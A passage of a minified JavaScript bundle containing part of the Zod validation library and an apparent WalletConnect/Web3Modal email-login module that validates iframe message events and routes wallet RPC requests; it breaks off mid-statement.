c=Su(t[s],e[s]);if(!c.valid)return{valid:!1};a[s]=c.data}return{valid:!0,data:a}}else if(n===J.array&&r===J.array){if(t.length!==e.length)return{valid:!1};const o=[];for(let i=0;i<t.length;i++){const a=t[i],s=e[i],c=Su(a,s);if(!c.valid)return{valid:!1};o.push(c.data)}return{valid:!0,data:o}}else return n===J.date&&r===J.date&&+t==+e?{valid:!0,data:t}:{valid:!1}}class xa extends Te{_parse(e){const{status:n,ctx:r}=this._processInputParams(e),o=(i,a)=>{if(Eu(i)||Eu(a))return be;const s=Su(i.value,a.value);return s.valid?((Cu(i)||Cu(a))&&n.dirty(),{status:n.value,value:s.data}):(te(r,{code:V.invalid_intersection_types}),be)};return r.common.async?Promise.all([this._def.left._parseAsync({data:r.data,path:r.path,parent:r}),this._def.right._parseAsync({data:r.data,path:r.path,parent:r})]).then(([i,a])=>o(i,a)):o(this._def.left._parseSync({data:r.data,path:r.path,parent:r}),this._def.right._parseSync({data:r.data,path:r.path,parent:r}))}}xa.create=(t,e,n)=>new xa({left:t,right:e,typeName:fe.ZodIntersection,..._e(n)});class On extends Te{_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==J.array)return te(r,{code:V.invalid_type,expected:J.array,received:r.parsedType}),be;if(r.data.length<this._def.items.length)return te(r,{code:V.too_small,minimum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),be;!this._def.rest&&r.data.length>this._def.items.length&&(te(r,{code:V.too_big,maximum:this._def.items.length,inclusive:!0,exact:!1,type:"array"}),n.dirty());const i=[...r.data].map((a,s)=>{const c=this._def.items[s]||this._def.rest;return c?c._parse(new $n(r,a,r.path,s)):null}).filter(a=>!!a);return r.common.async?Promise.all(i).then(a=>yt.mergeArray(n,a)):yt.mergeArray(n,i)}get items(){return this._def.items}rest(e){return new On({...this._def,rest:e})}}On.create=(t,e)=>{if(!Array.isArray(t))throw new Error("You must pass an array of schemas to z.tuple([ ... ])");return new On({items:t,typeName:fe.ZodTuple,rest:null,..._e(e)})};class _a extends Te{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==J.object)return te(r,{code:V.invalid_type,expected:J.object,received:r.parsedType}),be;const o=[],i=this._def.keyType,a=this._def.valueType;for(const s in r.data)o.push({key:i._parse(new $n(r,s,r.path,s)),value:a._parse(new $n(r,r.data[s],r.path,s))});return r.common.async?yt.mergeObjectAsync(n,o):yt.mergeObjectSync(n,o)}get element(){return this._def.valueType}static create(e,n,r){return n instanceof Te?new _a({keyType:e,valueType:n,typeName:fe.ZodRecord,..._e(r)}):new _a({keyType:en.create(),valueType:e,typeName:fe.ZodRecord,..._e(n)})}}class Ys extends Te{get keySchema(){return this._def.keyType}get valueSchema(){return this._def.valueType}_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==J.map)return te(r,{code:V.invalid_type,expected:J.map,received:r.parsedType}),be;const o=this._def.keyType,i=this._def.valueType,a=[...r.data.entries()].map(([s,c],l)=>({key:o._parse(new $n(r,s,r.path,[l,"key"])),value:i._parse(new $n(r,c,r.path,[l,"value"]))}));if(r.common.async){const s=new Map;return Promise.resolve().then(async()=>{for(const c of a){const l=await c.key,u=await c.value;if(l.status==="aborted"||u.status==="aborted")return be;(l.status==="dirty"||u.status==="dirty")&&n.dirty(),s.set(l.value,u.value)}return{status:n.value,value:s}})}else{const s=new Map;for(const c of a){const l=c.key,u=c.value;if(l.status==="aborted"||u.status==="aborted")return be;(l.status==="dirty"||u.status==="dirty")&&n.dirty(),s.set(l.value,u.value)}return{status:n.value,value:s}}}}Ys.create=(t,e,n)=>new Ys({valueType:e,keyType:t,typeName:fe.ZodMap,..._e(n)});class ai extends Te{_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.parsedType!==J.set)return te(r,{code:V.invalid_type,expected:J.set,received:r.parsedType}),be;const o=this._def;o.minSize!==null&&r.data.size<o.minSize.value&&(te(r,{code:V.too_small,minimum:o.minSize.value,type:"set",inclusive:!0,exact:!1,message:o.minSize.message}),n.dirty()),o.maxSize!==null&&r.data.size>o.maxSize.value&&(te(r,{code:V.too_big,maximum:o.maxSize.value,type:"set",inclusive:!0,exact:!1,message:o.maxSize.message}),n.dirty());const i=this._def.valueType;function a(c){const l=new Set;for(const u of c){if(u.status==="aborted")return be;u.status==="dirty"&&n.dirty(),l.add(u.value)}return{status:n.value,value:l}}const s=[...r.data.values()].map((c,l)=>i._parse(new $n(r,c,r.path,l)));return r.common.async?Promise.all(s).then(c=>a(c)):a(s)}min(e,n){return new ai({...this._def,minSize:{value:e,message:ue.toString(n)}})}max(e,n){return new ai({...this._def,maxSize:{value:e,message:ue.toString(n)}})}size(e,n){return this.min(e,n).max(e,n)}nonempty(e){return this.min(1,e)}}ai.create=(t,e)=>new ai({valueType:t,minSize:null,maxSize:null,typeName:fe.ZodSet,..._e(e)});class Di extends Te{constructor(){super(...arguments),this.validate=this.implement}_parse(e){const{ctx:n}=this._processInputParams(e);if(n.parsedType!==J.function)return te(n,{code:V.invalid_type,expected:J.function,received:n.parsedType}),be;function r(s,c){return Zs({data:s,path:n.path,errorMaps:[n.common.contextualErrorMap,n.schemaErrorMap,Vs(),ma].filter(l=>!!l),issueData:{code:V.invalid_arguments,argumentsError:c}})}function o(s,c){return Zs({data:s,path:n.path,errorMaps:[n.common.contextualErrorMap,n.schemaErrorMap,Vs(),ma].filter(l=>!!l),issueData:{code:V.invalid_return_type,returnTypeError:c}})}const i={errorMap:n.common.contextualErrorMap},a=n.data;if(this._def.returns instanceof Qi){const s=this;return St(async function(...c){const l=new nn([]),u=await s._def.args.parseAsync(c,i).catch(g=>{throw l.addIssue(r(c,g)),l}),p=await Reflect.apply(a,this,u);return await s._def.returns._def.type.parseAsync(p,i).catch(g=>{throw l.addIssue(o(p,g)),l})})}else{const s=this;return St(function(...c){const l=s._def.args.safeParse(c,i);if(!l.success)throw new nn([r(c,l.error)]);const u=Reflect.apply(a,this,l.data),p=s._def.returns.safeParse(u,i);if(!p.success)throw new nn([o(u,p.error)]);return p.data})}}parameters(){return this._def.args}returnType(){return this._def.returns}args(...e){return new Di({...this._def,args:On.create(e).rest(Fr.create())})}returns(e){return new Di({...this._def,returns:e})}implement(e){return this.parse(e)}strictImplement(e){return this.parse(e)}static create(e,n,r){return new Di({args:e||On.create([]).rest(Fr.create()),returns:n||Fr.create(),typeName:fe.ZodFunction,..._e(r)})}}class Ea extends Te{get schema(){return this._def.getter()}_parse(e){const{ctx:n}=this._processInputParams(e);return this._def.getter()._parse({data:n.data,path:n.path,parent:n})}}Ea.create=(t,e)=>new Ea({getter:t,typeName:fe.ZodLazy,..._e(e)});class Ca extends Te{_parse(e){if(e.data!==this._def.value){const n=this._getOrReturnCtx(e);return te(n,{received:n.data,code:V.invalid_literal,expected:this._def.value}),be}return{status:"valid",value:e.data}}get value(){return this._def.value}}Ca.create=(t,e)=>new Ca({value:t,typeName:fe.ZodLiteral,..._e(e)});function m1(t,e){return new yr({values:t,typeName:fe.ZodEnum,..._e(e)})}class yr extends Te{_parse(e){if(typeof e.data!="string"){const n=this._getOrReturnCtx(e),r=this._def.values;return te(n,{expected:Me.joinValues(r),received:n.parsedType,code:V.invalid_type}),be}if(this._def.values.indexOf(e.data)===-1){const n=this._getOrReturnCtx(e),r=this._def.values;return te(n,{received:n.data,code:V.invalid_enum_value,options:r}),be}return St(e.data)}get options(){return this._def.values}get enum(){const e={};for(const n of this._def.values)e[n]=n;return e}get Values(){const e={};for(const n of this._def.values)e[n]=n;return e}get Enum(){const e={};for(const n of this._def.values)e[n]=n;return e}extract(e){return yr.create(e)}exclude(e){return yr.create(this.options.filter(n=>!e.includes(n)))}}yr.create=m1;class Sa extends Te{_parse(e){const n=Me.getValidEnumValues(this._def.values),r=this._getOrReturnCtx(e);if(r.parsedType!==J.string&&r.parsedType!==J.number){const o=Me.objectValues(n);return te(r,{expected:Me.joinValues(o),received:r.parsedType,code:V.invalid_type}),be}if(n.indexOf(e.data)===-1){const o=Me.objectValues(n);return te(r,{received:r.data,code:V.invalid_enum_value,options:o}),be}return St(e.data)}get enum(){return this._def.values}}Sa.create=(t,e)=>new Sa({values:t,typeName:fe.ZodNativeEnum,..._e(e)});class Qi extends Te{unwrap(){return this._def.type}_parse(e){const{ctx:n}=this._processInputParams(e);if(n.parsedType!==J.promise&&n.common.async===!1)return te(n,{code:V.invalid_type,expected:J.promise,received:n.parsedType}),be;const r=n.parsedType===J.promise?n.data:Promise.resolve(n.data);return St(r.then(o=>this._def.type.parseAsync(o,{path:n.path,errorMap:n.common.contextualErrorMap})))}}Qi.create=(t,e)=>new Qi({type:t,typeName:fe.ZodPromise,..._e(e)});class dn extends Te{innerType(){return this._def.schema}sourceType(){return this._def.schema._def.typeName===fe.ZodEffects?this._def.schema.sourceType():this._def.schema}_parse(e){const{status:n,ctx:r}=this._processInputParams(e),o=this._def.effect||null,i={addIssue:a=>{te(r,a),a.fatal?n.abort():n.dirty()},get path(){return r.path}};if(i.addIssue=i.addIssue.bind(i),o.type==="preprocess"){const a=o.transform(r.data,i);return r.common.issues.length?{status:"dirty",value:r.data}:r.common.async?Promise.resolve(a).then(s=>this._def.schema._parseAsync({data:s,path:r.path,parent:r})):this._def.schema._parseSync({data:a,path:r.path,parent:r})}if(o.type==="refinement"){const a=s=>{const c=o.refinement(s,i);if(r.common.async)return Promise.resolve(c);if(c instanceof Promise)throw new Error("Async refinement encountered during synchronous parse operation. Use .parseAsync instead.");return s};if(r.common.async===!1){const s=this._def.schema._parseSync({data:r.data,path:r.path,parent:r});return s.status==="aborted"?be:(s.status==="dirty"&&n.dirty(),a(s.value),{status:n.value,value:s.value})}else return this._def.schema._parseAsync({data:r.data,path:r.path,parent:r}).then(s=>s.status==="aborted"?be:(s.status==="dirty"&&n.dirty(),a(s.value).then(()=>({status:n.value,value:s.value}))))}if(o.type==="transform")if(r.common.async===!1){const a=this._def.schema._parseSync({data:r.data,path:r.path,parent:r});if(!ga(a))return a;const s=o.transform(a.value,i);if(s instanceof Promise)throw new Error("Asynchronous transform encountered during synchronous parse operation. Use .parseAsync instead.");return{status:n.value,value:s}}else return this._def.schema._parseAsync({data:r.data,path:r.path,parent:r}).then(a=>ga(a)?Promise.resolve(o.transform(a.value,i)).then(s=>({status:n.value,value:s})):a);Me.assertNever(o)}}dn.create=(t,e,n)=>new dn({schema:t,typeName:fe.ZodEffects,effect:e,..._e(n)});dn.createWithPreprocess=(t,e,n)=>new dn({schema:e,effect:{type:"preprocess",transform:t},typeName:fe.ZodEffects,..._e(n)});class jn extends Te{_parse(e){return this._getType(e)===J.undefined?St(void 0):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}jn.create=(t,e)=>new jn({innerType:t,typeName:fe.ZodOptional,..._e(e)});class si extends Te{_parse(e){return this._getType(e)===J.null?St(null):this._def.innerType._parse(e)}unwrap(){return this._def.innerType}}si.create=(t,e)=>new si({innerType:t,typeName:fe.ZodNullable,..._e(e)});class Aa extends Te{_parse(e){const{ctx:n}=this._processInputParams(e);let r=n.data;return n.parsedType===J.undefined&&(r=this._def.defaultValue()),this._def.innerType._parse({data:r,path:n.path,parent:n})}removeDefault(){return this._def.innerType}}Aa.create=(t,e)=>new Aa({innerType:t,typeName:fe.ZodDefault,defaultValue:typeof e.default=="function"?e.default:()=>e.default,..._e(e)});class Js extends Te{_parse(e){const{ctx:n}=this._processInputParams(e),r={...n,common:{...n.common,issues:[]}},o=this._def.innerType._parse({data:r.data,path:r.path,parent:{...r}});return Gs(o)?o.then(i=>({status:"valid",value:i.status==="valid"?i.value:this._def.catchValue({get error(){return new nn(r.common.issues)},input:r.data})})):{status:"valid",value:o.status==="valid"?o.value:this._def.catchValue({get error(){return new nn(r.common.issues)},input:r.data})}}removeCatch(){return this._def.innerType}}Js.create=(t,e)=>new Js({innerType:t,typeName:fe.ZodCatch,catchValue:typeof e.catch=="function"?e.catch:()=>e.catch,..._e(e)});class Xs extends Te{_parse(e){if(this._getType(e)!==J.nan){const r=this._getOrReturnCtx(e);return te(r,{code:V.invalid_type,expected:J.nan,received:r.parsedType}),be}return{status:"valid",value:e.data}}}Xs.create=t=>new Xs({typeName:fe.ZodNaN,..._e(t)});const p6=Symbol("zod_brand");class g1 extends Te{_parse(e){const{ctx:n}=this._processInputParams(e),r=n.data;return this._def.type._parse({data:r,path:n.path,parent:n})}unwrap(){return this._def.type}}class Ka extends Te{_parse(e){const{status:n,ctx:r}=this._processInputParams(e);if(r.common.async)return(async()=>{const i=await this._def.in._parseAsync({data:r.data,path:r.path,parent:r});return i.status==="aborted"?be:i.status==="dirty"?(n.dirty(),p1(i.value)):this._def.out._parseAsync({data:i.value,path:r.path,parent:r})})();{const o=this._def.in._parseSync({data:r.data,path:r.path,parent:r});return o.status==="aborted"?be:o.status==="dirty"?(n.dirty(),{status:"dirty",value:o.value}):this._def.out._parseSync({data:o.value,path:r.path,parent:r})}}static create(e,n){return new Ka({in:e,out:n,typeName:fe.ZodPipeline})}}class Qs extends Te{_parse(e){const n=this._def.innerType._parse(e);return ga(n)&&(n.value=Object.freeze(n.value)),n}}Qs.create=(t,e)=>new Qs({innerType:t,typeName:fe.ZodReadonly,..._e(e)});const w1=(t,e={},n)=>t?Xi.create().superRefine((r,o)=>{var i,a;if(!t(r)){const s=typeof e=="function"?e(r):typeof e=="string"?{message:e}:e,c=(a=(i=s.fatal)!==null&&i!==void 0?i:n)!==null&&a!==void 0?a:!0,l=typeof s=="string"?{message:s}:s;o.addIssue({code:"custom",...l,fatal:c})}}):Xi.create(),m6={object:qe.lazycreate};var fe;(function(t){t.ZodString="ZodString",t.ZodNumber="ZodNumber",t.ZodNaN="ZodNaN",t.ZodBigInt="ZodBigInt",t.ZodBoolean="ZodBoolean",t.ZodDate="ZodDate",t.ZodSymbol="ZodSymbol",t.ZodUndefined="ZodUndefined",t.ZodNull="ZodNull",t.ZodAny="ZodAny",t.ZodUnknown="ZodUnknown",t.ZodNever="ZodNever",t.ZodVoid="ZodVoid",t.ZodArray="ZodArray",t.ZodObject="ZodObject",t.ZodUnion="ZodUnion",t.ZodDiscriminatedUnion="ZodDiscriminatedUnion",t.ZodIntersection="ZodIntersection",t.ZodTuple="ZodTuple",t.ZodRecord="ZodRecord",t.ZodMap="ZodMap",t.ZodSet="ZodSet",t.ZodFunction="ZodFunction",t.ZodLazy="ZodLazy",t.ZodLiteral="ZodLiteral",t.ZodEnum="ZodEnum",t.ZodEffects="ZodEffects",t.ZodNativeEnum="ZodNativeEnum",t.ZodOptional="ZodOptional",t.ZodNullable="ZodNullable",t.ZodDefault="ZodDefault",t.ZodCatch="ZodCatch",t.ZodPromise="ZodPromise",t.ZodBranded="ZodBranded",t.ZodPipeline="ZodPipeline",t.ZodReadonly="ZodReadonly"})(fe||(fe={}));const g6=(t,e={message:`Input not instance of ${t.name}`})=>w1(n=>n instanceof t,e),b1=en.create,y1=wr.create,w6=Xs.create,b6=br.create,v1=wa.create,y6=oi.create,v6=qs.create,x6=ba.create,_6=ya.create,E6=Xi.create,C6=Fr.create,S6=Vn.create,A6=Ks.create,T6=rn.create,I6=qe.create,$6=qe.strictCreate,O6=va.create,P6=qc.create,D6=xa.create,R6=On.create,N6=_a.create,k6=Ys.create,M6=ai.create,U6=Di.create,B6=Ea.create,L6=Ca.create,j6=yr.create,F6=Sa.create,W6=Qi.create,w0=dn.create,z6=jn.create,H6=si.create,V6=dn.createWithPreprocess,Z6=Ka.create,G6=()=>b1().optional(),q6=()=>y1().optional(),K6=()=>v1().optional(),Y6={string:t=>en.create({...t,coerce:!0}),number:t=>wr.create({...t,coerce:!0}),boolean:t=>wa.create({...t,coerce:!0}),bigint:t=>br.create({...t,coerce:!0}),date:t=>oi.create({...t,coerce:!0})},J6=be;var F=Object.freeze({__proto__:null,defaultErrorMap:ma,setErrorMap:t6,getErrorMap:Vs,makeIssue:Zs,EMPTY_PATH:n6,addIssueToContext:te,ParseStatus:yt,INVALID:be,DIRTY:p1,OK:St,isAborted:Eu,isDirty:Cu,isValid:ga,isAsync:Gs,get util(){return Me},get objectUtil(){return _u},ZodParsedType:J,getParsedType:nr,ZodType:Te,ZodString:en,ZodNumber:wr,ZodBigInt:br,ZodBoolean:wa,ZodDate:oi,ZodSymbol:qs,ZodUndefined:ba,ZodNull:ya,ZodAny:Xi,ZodUnknown:Fr,ZodNever:Vn,ZodVoid:Ks,ZodArray:rn,ZodObject:qe,ZodUnion:va,ZodDiscriminatedUnion:qc,ZodIntersection:xa,ZodTuple:On,ZodRecord:_a,ZodMap:Ys,ZodSet:ai,ZodFunction:Di,ZodLazy:Ea,ZodLiteral:Ca,ZodEnum:yr,ZodNativeEnum:Sa,ZodPromise:Qi,ZodEffects:dn,ZodTransformer:dn,ZodOptional:jn,ZodNullable:si,ZodDefault:Aa,ZodCatch:Js,ZodNaN:Xs,BRAND:p6,ZodBranded:g1,ZodPipeline:Ka,ZodReadonly:Qs,custom:w1,Schema:Te,ZodSchema:Te,late:m6,get ZodFirstPartyTypeKind(){return fe},coerce:Y6,any:E6,array:T6,bigint:b6,boolean:v1,date:y6,discriminatedUnion:P6,effect:w0,enum:j6,function:U6,instanceof:g6,intersection:D6,lazy:B6,literal:L6,map:k6,nan:w6,nativeEnum:F6,never:S6,null:_6,nullable:H6,number:y1,object:I6,oboolean:K6,onumber:q6,optional:z6,ostring:G6,pipeline:Z6,preprocess:V6,promise:W6,record:N6,set:M6,strictObject:$6,string:b1,symbol:v6,transformer:w0,tuple:R6,undefined:x6,union:O6,unknown:C6,void:A6,NEVER:J6,ZodIssueCode:V,quotelessJson:e6,ZodError:nn});const zt=F.object({message:F.string()});function Oe(t){return F.literal(ae[t])}const X6=F.object({chainId:F.number()}),Q6=F.object({email:F.string().email()}),e4=F.object({otp:F.string()}),t4=F.object({chainId:F.optional(F.number())}),n4=F.object({email:F.string().email()}),r4=F.object({themeMode:F.optional(F.enum(["light","dark"])),themeVariables:F.optional(F.record(F.string(),F.string().or(F.number())))}),i4=F.object({action:F.enum(["VERIFY_DEVICE","VERIFY_OTP"])}),o4=F.object({email:F.string().email(),address:F.string(),chainId:F.number()}),a4=F.object({isConnected:F.boolean()}),s4=F.object({chainId:F.number()}),c4=F.object({chainId:F.number()}),l4=F.object({email:F.string().email()}),u4=F.string(),d4=F.object({method:F.literal("personal_sign"),params:F.array(F.any())}),f4=F.object({method:F.literal("eth_sendTransaction"),params:F.array(F.any())}),h4=F.object({method:F.literal("eth_accounts")}),p4=F.object({method:F.literal("eth_getBalance"),params:F.array(F.any())}),m4=F.object({method:F.literal("eth_estimateGas"),params:F.array(F.any())}),g4=F.object({method:F.literal("eth_gasPrice")}),w4=F.object({method:F.literal("eth_signTypedData_v4"),params:F.array(F.any())}),b4=F.object({method:F.literal("eth_blockNumber")}),y4=F.object({method:F.literal("eth_chainId")}),b0=F.object({token:F.string()}),ds={appEvent:F.object({type:Oe("APP_SWITCH_NETWORK"),payload:X6}).or(F.object({type:Oe("APP_CONNECT_EMAIL"),payload:Q6})).or(F.object({type:Oe("APP_CONNECT_DEVICE")})).or(F.object({type:Oe("APP_CONNECT_OTP"),payload:e4})).or(F.object({type:Oe("APP_GET_USER"),payload:F.optional(t4)})).or(F.object({type:Oe("APP_SIGN_OUT")})).or(F.object({type:Oe("APP_IS_CONNECTED"),payload:F.optional(b0)})).or(F.object({type:Oe("APP_GET_CHAIN_ID")})).or(F.object({type:Oe("APP_RPC_REQUEST"),payload:d4.or(f4).or(h4).or(p4).or(m4).or(g4).or(w4).or(b4).or(y4)})).or(F.object({type:Oe("APP_UPDATE_EMAIL"),payload:n4})).or(F.object({type:Oe("APP_AWAIT_UPDATE_EMAIL")})).or(F.object({type:Oe("APP_SYNC_THEME"),payload:r4})),frameEvent:F.object({type:Oe("FRAME_SWITCH_NETWORK_ERROR"),payload:zt}).or(F.object({type:Oe("FRAME_SWITCH_NETWORK_SUCCESS"),payload:c4})).or(F.object({type:Oe("FRAME_CONNECT_EMAIL_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_CONNECT_EMAIL_SUCCESS"),payload:i4})).or(F.object({type:Oe("FRAME_CONNECT_OTP_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_CONNECT_OTP_SUCCESS")})).or(F.object({type:Oe("FRAME_CONNECT_DEVICE_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_CONNECT_DEVICE_SUCCESS")})).or(F.object({type:Oe("FRAME_GET_USER_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_GET_USER_SUCCESS"),payload:o4})).or(F.object({type:Oe("FRAME_SIGN_OUT_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_SIGN_OUT_SUCCESS")})).or(F.object({type:Oe("FRAME_IS_CONNECTED_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_IS_CONNECTED_SUCCESS"),payload:a4})).or(F.object({type:Oe("FRAME_GET_CHAIN_ID_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_GET_CHAIN_ID_SUCCESS"),payload:s4})).or(F.object({type:Oe("FRAME_RPC_REQUEST_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_RPC_REQUEST_SUCCESS"),payload:u4})).or(F.object({type:Oe("FRAME_SESSION_UPDATE"),payload:b0})).or(F.object({type:Oe("FRAME_UPDATE_EMAIL_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_UPDATE_EMAIL_SUCCESS")})).or(F.object({type:Oe("FRAME_AWAIT_UPDATE_EMAIL_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_AWAIT_UPDATE_EMAIL_SUCCESS"),payload:l4})).or(F.object({type:Oe("FRAME_SYNC_THEME_ERROR"),payload:zt})).or(F.object({type:Oe("FRAME_SYNC_THEME_SUCCESS")}))},Bt={set(t,e){localStorage.setItem(`${ae.STORAGE_KEY}${t}`,e)},get(t){return localStorage.getItem(`${ae.STORAGE_KEY}${t}`)},delete(t){localStorage.removeItem(`${ae.STORAGE_KEY}${t}`)}},v4=["ASIA/SHANGHAI","ASIA/URUMQI","ASIA/CHONGQING","ASIA/HARBIN","ASIA/KASHGAR","ASIA/MACAU","ASIA/HONG_KONG","ASIA/MACAO","ASIA/BEIJING","ASIA/HARBIN"],fs=30*1e3,Ta={getBlockchainApiUrl(){try{const{timeZone:t}=new Intl.DateTimeFormat().resolvedOptions(),e=t.toUpperCase();return v4.includes(e)?"https://rpc.walletconnect.org":"https://rpc.walletconnect.com"}catch{return!1}},checkIfAllowedToTriggerEmail(){const t=Bt.get(ae.LAST_EMAIL_LOGIN_TIME);if(t){const e=Date.now()-Number(t);if(e<fs){const n=Math.ceil((fs-e)/1e3);throw new Error(`Please try again after ${n} seconds`)}}},getTimeToNextEmailLogin(){const t=Bt.get(ae.LAST_EMAIL_LOGIN_TIME);if(t){const e=Date.now()-Number(t);if(e<fs)return Math.ceil((fs-e)/1e3)}return 0}};class x4{constructor(e,n=!1){if(this.iframe=null,this.rpcUrl=Ta.getBlockchainApiUrl(),this.events={onFrameEvent:r=>{window.addEventListener("message",({data:o})=>{var a;if(!((a=o.type)!=null&&a.includes(ae.FRAME_EVENT_KEY)))return;const i=ds.frameEvent.parse(o);r(i)})},onAppEvent:r=>{window.addEventListener("message",({data:o})=>{var a;if(!((a=o.type)!=null&&a.includes(ae.APP_EVENT_KEY)))return;const i=ds.appEvent.parse(o);r(i)})},postAppEvent:r=>{var o;if(!((o=this.iframe)!=null&&o.contentWindow))throw new Error("W3mFrame: iframe is not set");ds.appEvent.parse(r),window.postMessage(r),this.iframe.contentWindow.postMessage(r,"*")},postFrameEvent:r=>{if(!parent)throw new Error("W3mFrame: parent is not set");ds.frameEvent.parse(r),parent.postMessage(r,"*")}},this.projectId=e,this.frameLoadPromise=new Promise((r,o)=>{this.frameLoadPromiseResolver={resolve:r,reject:o}}),n){this.frameLoadPromise=new Promise((o,i)=>{this.frameLoadPromiseResolver={resolve:o,reject:i}});const r=document.createElement("iframe");r.id="w3m-iframe",r.src=`${ae.SECURE_SITE_SDK}?projectId=${e}`,r.style.position="fixed",r.style.zIndex="999999",r.style.display="none",r.style.opacity="0",r.style.borderRadius="clamp(0px, var(--wui-border-radius-l), 44px)",document.body.appendChild(r),this.iframe=r,this.iframe.onload=()=>{var o;(o=this.frameLoadPromiseResolver)==null||o.resolve(void 0)},this.iframe.onerror=()=>{var o;(o=this.frameLoadPromiseResolver)==null||o.reject("Unable to load email login dependency")}}}get networks(){const e=[1,5,11155111,10,420,42161,421613,137,80001,42220,1313161554,1313161555,56,97,43114,43113,324,280,100,8453,84531,7777777,999].map(n=>({[n]:{rpcUrl:`${this.rpcUrl}/v1/?chainId=eip155:${n}&projectId=${this.projectId}`,chainId:n}}));return Object.assign({},...e)}}class _4{constructor(e){this.connectEmailResolver=void 0,this.connectDeviceResolver=void 0,this.connectOtpResolver=void 0,this.connectResolver=void 0,this.disconnectResolver=void 0,this.isConnectedResolver=void 0,this.getChainIdResolver=void 0,this.switchChainResolver=void 0,this.rpcRequestResolver=void 0,this.updateEmailResolver=void 0,this.awaitUpdateEmailResolver=void 0,this.syncThemeResolver=void 0,this.w3mFrame=new x4(e,!0),this.w3mFrame.events.onFrameEvent(n=>{switch(console.log("💻 received",n),n.type){case ae.FRAME_CONNECT_EMAIL_SUCCESS:return this.onConnectEmailSuccess(n);case ae.FRAME_CONNECT_EMAIL_ERROR:return this.onConnectEmailError(n);case ae.FRAME_CONNECT_DEVICE_SUCCESS:return this.onConnectDeviceSuccess();case ae.FRAME_CONNECT_DEVICE_ERROR:return this.onConnectDeviceError(n);case ae.FRAME_CONNECT_OTP_SUCCESS:return this.onConnectOtpSuccess();case ae.FRAME_CONNECT_OTP_ERROR:return this.onConnectOtpError(n);case ae.FRAME_GET_USER_SUCCESS:return this.onConnectSuccess(n);case ae.FRAME_GET_USER_ERROR:return this.onConnectError(n);case ae.FRAME_IS_CONNECTED_SUCCESS:return this.onIsConnectedSuccess(n);case ae.FRAME_IS_CONNECTED_ERROR:return this.onIsConnectedError(n);case ae.FRAME_GET_CHAIN_ID_SUCCESS:return this.onGetChainIdSuccess(n);case ae.FRAME_GET_CHAIN_ID_ERROR:return this.onGetChainIdError(n);case ae.FRAME_SIGN_OUT_SUCCESS:return this.onSignOutSuccess();case ae.FRAME_SIGN_OUT_ERROR:return this.onSignOutError(n);case ae.FRAME_SWITCH_NETWORK_SUCCESS:return this.onSwitchChainSuccess(n);case ae.FRAME_SWITCH_NETWORK_ERROR:return this.onSwitchChainError(n);case ae.FRAME_RPC_REQUEST_SUCCESS:return this.onRpcRequestSuccess(n);case ae.FRAME_RPC_REQUEST_ERROR:return this.onRpcRequestError(n);case ae.FRAME_SESSION_UPDATE:return this.onSessionUpdate(n);case ae.FRAME_UPDATE_EMAIL_SUCCESS:return this.onUpdateEmailSuccess();case ae.FRAME_UPDATE_EMAIL_ERROR:return this.onUpdateEmailError(n);case ae.FRAME_AWAIT_UPDATE_EMAIL_SUCCESS:return this.onAwaitUpdateEmailSuccess(n);case ae.FRAME_AWAIT_UPDATE_EMAIL_ERROR:return this.onAwaitUpdateEmailError(n);case ae.FRAME_SYNC_THEME_SUCCESS:return this.onSyncThemeSuccess();case ae.FRAME_SYNC_THEME_ERROR:return this.onSyncThemeError(n);default:return null}})}getLoginEmailUsed(){return!!Bt.get(ae.EMAIL_LOGIN_USED_KEY)}getEmail(){return Bt.get(ae.EMAIL)}async connectEmail(e){return await this.w3mFrame.frameLoadPromise,Ta.checkIfAllowedToTriggerEmail(),this.w3mFrame.events.postAppEvent({type:ae.APP_CONNECT_EMAIL,payload:e}),new Promise((n,r)=>{this.connectEmailResolver={resolve:n,reject:r}})}async connectDevice(){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_CONNECT_DEVICE}),new Promise((e,n)=>{this.connectDeviceResolver={resolve:e,reject:n}})}async connectOtp(e){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_CONNECT_OTP,payload:e}),new Promise((n,r)=>{this.connectOtpResolver={resolve:n,reject:r}})}async isConnected(){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_IS_CONNECTED,payload:void 0}),new Promise((e,n)=>{this.isConnectedResolver={resolve:e,reject:n}})}async getChainId(){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_GET_CHAIN_ID}),new Promise((e,n)=>{this.getChainIdResolver={resolve:e,reject:n}})}async updateEmail(e){return await this.w3mFrame.frameLoadPromise,Ta.checkIfAllowedToTriggerEmail(),this.w3mFrame.events.postAppEvent({type:ae.APP_UPDATE_EMAIL,payload:e}),new Promise((n,r)=>{this.updateEmailResolver={resolve:n,reject:r}})}async awaitUpdateEmail(){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_AWAIT_UPDATE_EMAIL}),new Promise((e,n)=>{this.awaitUpdateEmailResolver={resolve:e,reject:n}})}async syncTheme(e){return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_SYNC_THEME,payload:e}),new Promise((n,r)=>{this.syncThemeResolver={resolve:n,reject:r}})}async connect(e){const n=(e==null?void 0:e.chainId)??this.getLastUsedChainId()??1;return await this.w3mFrame.frameLoadPromise,this.w3mFrame.events.postAppEvent({type:ae.APP_GET_USER,payload:{chainId:n}}),new Promise((r,o)=>{this.connectResolver={resolve:r,reject:o}})}async switchNetwork(e){return await 